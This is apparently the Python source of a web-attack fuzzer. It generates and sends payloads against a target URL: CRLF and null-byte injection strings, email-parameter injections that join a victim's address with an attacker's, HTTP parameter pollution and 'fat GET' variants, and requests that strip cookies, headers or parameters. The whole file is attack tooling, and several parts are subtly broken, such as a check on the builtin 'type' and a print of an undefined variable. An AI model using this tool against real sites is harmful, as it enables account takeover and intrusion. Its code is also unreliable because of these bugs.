#!/usr/bin/python3
# -*- coding: utf-8 -*-

import warnings
from bs4 import BeautifulSoup
from urllib.parse import urlparse, parse_qs, quote, urlencode, unquote
from collections import Counter, defaultdict
import sys
import re
import asyncio
import copy
import time
import json


warnings.filterwarnings("ignore")    # ignor any warning in teminal


#Colors 
class Colors:
    BOLD = '\033[1m'
    RESET = '\033[0m'
    RED = '\033[91m'
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    BLUE = '\033[94m'
    MAGENTA = '\033[95m'
    CYAN = '\033[96m'

#Vectors
delimiter = []
Curated = ["嘍嘊","%E2%A0%80%0A%E2%A0%80", "%0a%0a%0a%0a%0a","\u0000", "%00%00","%00", "%20%20",
        "%2f%2e%2e%0d%0a", "%25%32%65", "%5Ct", "%5Cn", "%5Cx0b%5Cx0c", "%20","%0"]
OOff = [
    "%00", "%01", "%02", "%03", "%04", "%05", "%06", "%07", "%08", "%09", "%0a", "%0b", "%0c", "%0d", "%0e", "%0f",
    "%10", "%11", "%12", "%13", "%14", "%15", "%16", "%17", "%18", "%19", "%1a", "%1b", "%1c", "%1d", "%1e", "%1f",
    "%20", "%21", "%22", "%23", "%24", "%25", "%26", "%27", "%28", "%29", "%2a", "%2b", "%2c", "%2d", "%2e", "%2f",
    "%30", "%31", "%32", "%33", "%34", "%35", "%36", "%37", "%38", "%39", "%3a", "%3b", "%3c", "%3d", "%3e", "%3f",
    "%40", "%41", "%42", "%43", "%44", "%45", "%46", "%47", "%48", "%49", "%4a", "%4b", "%4c", "%4d", "%4e", "%4f",
    "%50", "%51", "%52", "%53", "%54", "%55", "%56", "%57", "%58", "%59", "%5a", "%5b", "%5c", "%5d", "%5e", "%5f",
    "%60", "%61", "%62", "%63", "%64", "%65", "%66", "%67", "%68", "%69", "%6a", "%6b", "%6c", "%6d", "%6e", "%6f",
    "%70", "%71", "%72", "%73", "%74", "%75", "%76", "%77", "%78", "%79", "%7a", "%7b", "%7c", "%7d", "%7e", "%7f",
    "%80", "%81", "%82", "%83", "%84", "%85", "%86", "%87", "%88", "%89", "%8a", "%8b", "%8c", "%8d", "%8e", "%8f",
    "%90", "%91", "%92", "%93", "%94", "%95", "%96", "%97", "%98", "%99", "%9a", "%9b", "%9c", "%9d", "%9e", "%9f",
    "%a0", "%a1", "%a2", "%a3", "%a4", "%a5", "%a6", "%a7", "%a8", "%a9", "%aa", "%ab", "%ac", "%ad", "%ae", "%af",
    "%b0", "%b1", "%b2", "%b3", "%b4", "%b5", "%b6", "%b7", "%b8", "%b9", "%ba", "%bb", "%bc", "%bd", "%be", "%bf",
    "%c0", "%c1", "%c2", "%c3", "%c4", "%c5", "%c6", "%c7", "%c8", "%c9", "%ca", "%cb", "%cc", "%cd", "%ce", "%cf",
    "%d0", "%d1", "%d2", "%d3", "%d4", "%d5", "%d6", "%d7", "%d8", "%d9", "%da", "%db", "%dc", "%dd", "%de", "%df",
    "%e0", "%e1", "%e2", "%e3", "%e4", "%e5", "%e6", "%e7", "%e8", "%e9", "%ea", "%eb", "%ec", "%ed", "%ee", "%ef",
    "%f0", "%f1", "%f2", "%f3", "%f4", "%f5", "%f6", "%f7", "%f8", "%f9", "%fa", "%fb", "%fc", "%fd", "%fe", "%ff",
    "%00", "%0", ]
Twobyte = [f"{item}{item}" for item in OOff]
Crlf = ["%E2%A0%80%0A%E2%A0%80", "%0a%0a%0a%0a%0a",
        "嘍嘊", "%E5%98%8D%E5%98%8A", "%3f%0d", 
        "%2f%2e%2e%0d%0a", "%25%32%65"]

Tab = ["%5Ct", "%5Cn", "%5Cx0b%5Cx0c"]
Extra = ["%B0%B0%B0", "%2e%2e", "%5c%75%64%66%66%66%0a", "&",
         "%2f%2f.", "%3a%2f%2f", "°", "%ff%ff", "%0b%0b", 
         "%00%00", "%0a%0a", "%0d%0d", "%252e", "%E2%80%AE",
         "%00000000000000", "@%23!@%25$%5e&%25%5e%5e%25", "[]", "{}"]
EmailPays = ["@", "|", "||","|||", "%0Acc:", "&", "%", "#", "%", "%0Abcc:", "%5Cr%5Cn%20%5Cncc"]
HPP = ["&", ";", ":", "[]", "{}", "|", "||", "#", "@"]

class Main:
    def __init__(self, text=None, AD=None, A=None, Data=None, Method=None,
                 V=None, VT=None, Name=None, PAY=None, Print=None, 
                 Headers=None, Cookies=None, Worker=None, Url=None, Proxy=None):        
        self.text = text
        self.AD = AD
        self.A = A
        self.V = V
        self.VT = VT
        self.Name = Name
        self.PAY = PAY
        self.Data = Data
        self.Print = Print
        self.Method = Method
        self.Headers = Headers
        self.Cookies = Cookies
        self.Worker = Worker
        self.Url = Url
        self.Proxy = Proxy

    
    async def Payed(self, type=None):
        Payed = []
        unicode = ["\\udfff", "\\x00"]
        forUnicode = ["%20","%00", "%09", "%0d", "%0", "%01", "%bf", "%2f", "%0f",
           "%0b", "%0c", "%1c", "%1d", "%1e", "%1f", "%2A", 
           "%25", "%27", "%0d","%0a", "%40", "%23", "%ff", "%3b"]
        
        if type == "all":
            for x in forUnicode:   #Unicode
                unicode.append(f"\\u00{x.replace('%', '')}")
            for u in unicode:
                Payed.append(u)
            for c in Crlf:   #Crlf
                Payed.append(c)
            for t in Tab:   #Tab
                Payed.append(t)
            for e in Extra:     #Extra
                Payed.append(e)
            for p in OOff:  #00-FF
                Payed.append(p)
        elif type == "u":
            for x in forUnicode: 
                unicode.append(f"\\u00{x.replace('%', '')}")
            for u in unicode:
                Payed.append(quote(u))
        elif type == "crlf":
            for c in Crlf:  
                Payed.append(c)
        elif type == "tab":
            for t in Tab:   
                Payed.append(t)
        elif type == "extra":
            for e in Extra:   
                Payed.append(e)
        elif type == "ff":
            for p in OOff:  
                Payed.append(p)
        elif type == "wff": 
            for x in forUnicode:   
                unicode.append(f"\\u00{x.replace('%', '')}")
            for u in unicode:
                Payed.append(u)
            for c in Crlf:   
                Payed.append(c)
            for t in Tab:   
                Payed.append(t)
            for e in Extra:     
                Payed.append(e)
        elif type == "hpp":
            for h in HPP:     
                Payed.append(h)
        elif type == "e": 
            for e in EmailPays:
                Payed.append(e)
        elif type == "two":
            for two in Twobyte:
                Payed.append(two)
        elif type == "cu":
            for cu in Curated:
                Payed.append(cu)
        return list(set(Payed))
    
    async def abnormalizer(self, text):
        from utils import abnormalizer
        return abnormalizer.main(text=text)

    async def regexfuzzing(self, text, VT):
        import string
        import re
        async def TextGen(ch):
            Payed = []
            pay = await self.Payed(type=VT) 
            if ch in text:
                parts = text.split(ch)
                for x in range(len(parts) - 1):
                    before_separator = ch.join(parts[:x + 1])
                    after_separator = ch.join(parts[x + 1:])
                    
                    # Generating variations using each element from `pay`
                    for y in sorted(list(set(pay))):
                        Payed.append(before_separator + y + ch + after_separator)
                        Payed.append(f"{y}{text}")
                        Payed.append(f"{text}{y}")
                    for i in set(await self.abnormalizer(text=text)):
                        Payed.append(i)
            return Payed

        async def Main():
            final = set() 
            for ch in string.punctuation:
                generated_texts = await TextGen(ch=ch)
                final.update(generated_texts)  
            return sorted(final) 

        return await Main()
    

    async def Email_Pay(self, A=None, V=None, AD=None, Type=None):
        Genarated = []
        Pay_char = await self.Payed(type=self.VT)
        for xx in sorted(set(Pay_char)):
            #victim@mail.com@attackr@mail.com
            Genarated.append(f"{V}{xx}{A}")
            #name@Victim.com&attacker.com
            Genarated.append(f"{V}{xx}{AD}")
            #Array of emails
            Genarated.append(f"[{V}{xx}{A}]") 
        return Genarated 
    
    async def HPP(self, Type=None):
        Payed = []
        char = await self.Payed(type=self.VT)
        if Type == "Json":
            query_params = json.loads(self.Data)
            value = query_params.get(self.Name, [None])  
            """
            double the key: {'peram': 'value1', 'peram': 'value2'}
            as any duplicate key will overwrite the previous value. take This as for facility in someCases
            """
            
            #{'perma': ['value1', 'value2']}
            double_Value = defaultdict(list)
            double_Value[self.Name].append(value)
            double_Value[self.Name].append(self.PAY)
            Copy_QueryX = copy.deepcopy(query_params)
            del Copy_QueryX[self.Name]
            double_Value.update(query_params)
            Valued = dict(double_Value)
            Payed.append(json.dumps(Valued, indent=4))

            #{'peram': ['value1[Char]', 'value2']}
            for x in list(set(char)):
                Copy_Query = copy.deepcopy(query_params)
                dv2 = defaultdict(list)
                dv2[self.Name].append(f"{value}{x}")
                dv2[self.Name].append(self.PAY)
                del Copy_Query[self.Name]
                dv2.update(Copy_Query)
                Valued = dict(dv2)
                Payed.append(json.dumps(Valued, indent=4))
                
            #{'peram': ['value1', 'value2[Char]']}
            for x1 in list(set(char)):
                Copy_Query = copy.deepcopy(query_params)
                dv2 = defaultdict(list)
                dv2[self.Name].append(f"{value}")
                dv2[self.Name].append(f"{x1}{self.PAY}")
                del Copy_Query[self.Name]
                dv2.update(Copy_Query)
                Valued = dict(dv2)
                Payed.append(json.dumps(Valued, indent=4))
            #{'peram': ['value1[Char]', 'value2[Char]']}
            for x2 in list(set(char)):
                Copy_Query = copy.deepcopy(query_params)
                dv2 = defaultdict(list)
                dv2[self.Name].append(f"{value}{x2}")
                dv2[self.Name].append(f"{x2}{self.PAY}")
                del Copy_Query[self.Name]
                dv2.update(Copy_Query)
                Valued = dict(dv2)
                Payed.append(json.dumps(Valued, indent=4))
            #{'peram': ['[Char]value1', '[Char]value2']}
            for x3 in list(set(char)):
                Copy_Query = copy.deepcopy(query_params)
                dv2 = defaultdict(list)
                dv2[self.Name].append(f"{x3}{value}")
                dv2[self.Name].append(f"{x3}{self.PAY}")
                del Copy_Query[self.Name]
                dv2.update(Copy_Query)
                Valued = dict(dv2)
                Payed.append(json.dumps(Valued, indent=4))
            #{'peram': 'Value', '[Char]peram': 'Value'}
            for x4 in list(set(char)):
                Copy_Query = copy.deepcopy(query_params)
                Copy_Query[f"{x4}{self.Name}"] = self.PAY
                Payed.append(json.dumps(Copy_Query, indent=4))
            #{'peram': 'Value', 'peram[Char]': 'Value'}
            for x5 in list(set(char)):
                Copy_Query = copy.deepcopy(query_params)
                Copy_Query[f"{self.Name}{x5}"] = self.PAY
                Payed.append(json.dumps(Copy_Query, indent=4))

        else:
            query_params = copy.deepcopy(parse_qs(self.Data))
            value = query_params.get(self.Name, [None])[0]

            #name=value[with VT Vector]name=attacker;s
            for xx in char:
                query_params[self.Name] = f"{value}{xx}{self.Name}={self.PAY}"
                new_query_string = urlencode(query_params, doseq=True)
                Payed.append(unquote(new_query_string)) 

                #Peram%00anything=value 
                Payed.append(self.Data.replace(f"{self.Name}={value}", f"{self.Name}{xx}{self.PAY}={value}"))
                
                #email[VT]=attacker@mail.com[VT]alaminhossyin@gmail.com
                Payed.append(self.Data.replace(f"{self.Name}=", f"{self.Name}{xx}={self.PAY}{xx}"))

            #name=one&name[]=two as array
            for xx1 in char:
                if self.Name in query_params:
                    query_params[self.Name] = f"{value}&{self.Name}{xx1}={self.PAY}"
                    new_query_string = urlencode(query_params, doseq=True)
                    Payed.append(unquote(new_query_string))
            
            #name[]=one&name=two
            for xx2 in char:
                Peramed = f"{self.Name}{xx2}={self.PAY}&"
                pattern = rf"{self.Name}"
                new_text = re.sub(pattern, Peramed + pattern, self.Data)
                Payed.append(f"{new_text}")
            
            #name[]=one&name[]=
            for xx3 in char:
                Peramed = f"{self.Name}{xx3}={value}&{self.Name}{xx3}={self.PAY}"
                new_text = re.sub(rf"{self.Name}={value}", Peramed, unquote(self.Data), flags=re.IGNORECASE)
                Payed.append(new_text)

        return Payed
    
    async def Remove_Cookie(self):  #ONE By One!
        if 'Cookie' in self.Headers:
            Cookie = self.Headers['Cookie']
            C = []
            cookie_dict = {}
            cookies = Cookie.split('; ')
            for cookie in cookies:
                # Split each cookie at the '=' sign
                key, value = cookie.split('=', 1)
                # Add the key-value pair to the dictionary
                cookie_dict[key.strip()] = value.strip() 
            
            for param in list(cookie_dict.keys()):
                del cookie_dict[param]
                new_query_string = urlencode(cookie_dict, doseq=True)
                C.append(f"{new_query_string}".strip())
            return C
        
    async def Remove_Header(self):  #ONE By One!
       Headered = [
           {key: value for key, value in self.Headers.items() if key != k}
           for k in self.Headers
           ]
       
       return Headered
        
    
    async def Remove_Peram(self, Type=None):
        Peram = []
        if Type == "Json":
            print("Json")
        else:
            query_params = parse_qs(self.Data)
            for param in list(query_params.keys()):
                del query_params[param]
                new_query_string = urlencode(query_params, doseq=True)
                Peram.append(new_query_string) 
        
        return Peram
           
    async def FatGet(self, Type=None):
        from utils import requester
        
        if type == "Json":
            print("for Json")
        
        else:
            async def machine(method=None, Type=None):
                char = await self.Payed(type=self.VT)
                query_params = copy.deepcopy(parse_qs(self.Data))
                value = query_params.get(self.Name, [None])[0]

                """
                    Inurl: ?name=attackrr
                    body: name=victim
                """
                query_params[self.Name] = f"{self.PAY}"
                Queryfor_pay = urlencode(query_params, doseq=True)
                URL = f"{self.Url}?{Queryfor_pay}"

                semaphore = asyncio.Semaphore(1)  
                await requester.Main(Url=URL, Method=method, Data=self.Data,Semaphore=semaphore, Proxy=self.Proxy, Headers=self.Headers)
                    
                """
                    Inurl: ?name=victim
                    body: name=attacker
                """

                query_params[self.Name] = f"{self.PAY}"
                Queryfor_pay = urlencode(query_params, doseq=True)
                URL = f"{self.Url}?{self.Data}"
                Body = Queryfor_pay

                semaphore = asyncio.Semaphore(1)  
                await requester.Main(Url=URL, Method=method, Data=Body,Semaphore=semaphore, Proxy=self.Proxy, Headers=self.Headers)
            
                
                #ON URL
                URLed = []
                for xx in char:
                    query_params[self.Name] = f"{value}{xx}{self.Name}={self.PAY}"
                    new_query_string = urlencode(query_params, doseq=True)
                    URLed.append(f"{self.Url}?{unquote(new_query_string)}") 
                
                semaphore = asyncio.Semaphore(1)  
                tasks = [asyncio.create_task(requester.Main(Url=d, Method=self.Method, Data=self.Data,Semaphore=semaphore, Proxy=self.Proxy, Headers=self.Headers)) for d in list(set(URLed))]
                for task in asyncio.as_completed(tasks):
                    await task

                #ON Body
                for xx0 in char:
                    query_params[self.Name] = f"{value}{xx0}{self.Name}={self.PAY}"
                    new_query_string = urlencode(query_params, doseq=True)
                    Body = f"{unquote(new_query_string)}"
                    Url = f"{self.Url}?{self.Data}"
                    await requester.Main(Url=Url, Method=self.Method, Data=Body, Semaphore=semaphore, Proxy=self.Proxy, Headers=self.Headers)
                
                #HPP On bOTH
                for xx1 in char:
                    query_params[self.Name] = f"{value}{xx1}{self.Name}={self.PAY}"
                    new_query_string = urlencode(query_params, doseq=True)
                    Body = f"{unquote(new_query_string)}"
                    Url = f"{self.Url}?{unquote(new_query_string)}"
                    await requester.Main(Url=Url, Method=self.Method, Data=Body, Semaphore=semaphore, Proxy=self.Proxy, Headers=self.Headers)
                

            Methods = ['GET', 'POST']
            for x in Methods:
                await machine(method=x)

    async def fuzz_Method():
        print('soon')
    


   

    async def run(self, Type=None):
        from utils import requester
        if Type == "email":
            emailVector = await self.Email_Pay(A=self.A, V=self.V, AD=self.AD)
            if self.Data:
                Payed = []
                try:
                    bodydict = json.loads(self.Data)
                    for x in emailVector:
                        bodydict[self.Name] = x    
                        Payed.append(json.dumps(bodydict, indent=4))

                    if self.Print:
                        for x in Payed:
                            print(x)
                    else:
                        semaphore = asyncio.Semaphore(1)  
                        tasks = [asyncio.create_task(requester.Main(Url=self.Url, Method=self.Method, Data=d,Semaphore=semaphore, Proxy=self.Proxy, Headers=self.Headers)) for d in list(set(Payed))]
                        for task in asyncio.as_completed(tasks):
                            await task
                    
                except json.JSONDecodeError:
                    for x in emailVector:
                        bodydict = parse_qs(self.Data)
                        bodydict[self.Name] = x   
                        new_query_string = urlencode(bodydict, doseq=True)
                        print(new_query_string)
            
        elif Type == "rff":
            result = await self.regexfuzzing(text=self.text, VT=self.VT)
            if result:
                for x in result:
                    print(x)
        elif Type == "hpp":
            if self.Data:
                try:
                    bodydict = json.loads(self.Data)
                    Payed = await self.HPP(Type="Json")  
                    if self.Print:
                        for x in Payed:
                            print(x) 
                    else:
                        semaphore = asyncio.Semaphore(1)  
                        tasks = [asyncio.create_task(requester.Main(Url=self.Url, Method=self.Method, Data=d,Semaphore=semaphore, Proxy=self.Proxy, Headers=self.Headers)) for d in list(set(Payed))]
                        for task in asyncio.as_completed(tasks):
                            await task

                except json.JSONDecodeError:
                    Payed = await self.HPP()
                    if self.Print:
                        for x in result:
                            print(x)
                    else:
                        semaphore = asyncio.Semaphore(1)  
                        tasks = [asyncio.create_task(requester.Main(Url=self.Url, Method=self.Method, Data=d,Semaphore=semaphore, Proxy=self.Proxy, Headers=self.Headers)) for d in list(set(Payed))]
                        for task in asyncio.as_completed(tasks):
                            await task
        elif Type == 'rc':
            Payed = await self.Remove_Cookie()
            if self.Print:
                for x in Payed:
                    print(x)
            else:
                semaphore = asyncio.Semaphore(1)  
                tasks = [asyncio.create_task(requester.Main(Url=self.Url, Method=self.Method, Data=self.Data,Semaphore=semaphore, Proxy=self.Proxy, Headers=self.Headers, Cookie=d)) for d in list(set(Payed))]
                for task in asyncio.as_completed(tasks):
                    await task
        elif Type == 'rp':
            Payed = await self.Remove_Peram()
            if self.Print:
                for x in Payed:
                    print(x)
            else:
                semaphore = asyncio.Semaphore(1)  
                tasks = [asyncio.create_task(requester.Main(Url=self.Url, Method=self.Method, Data=self.Data,Semaphore=semaphore, Proxy=self.Proxy, Headers=self.Headers, Cookie=d)) for d in list(set(Payed))]
                for task in asyncio.as_completed(tasks):
                    await task
        elif Type == "rh":
            Payed = await self.Remove_Header()
            if self.Print:
                for x in Payed:
                    print(x)
            else:
                semaphore = asyncio.Semaphore(1)  
                tasks = [asyncio.create_task(requester.Main(Url=self.Url, Method=self.Method, Data=self.Data,Semaphore=semaphore, Proxy=self.Proxy, Headers=d)) for d in Payed]
                for task in asyncio.as_completed(tasks):
                    await task
        elif Type == "fat":
            Payed = await self.FatGet()

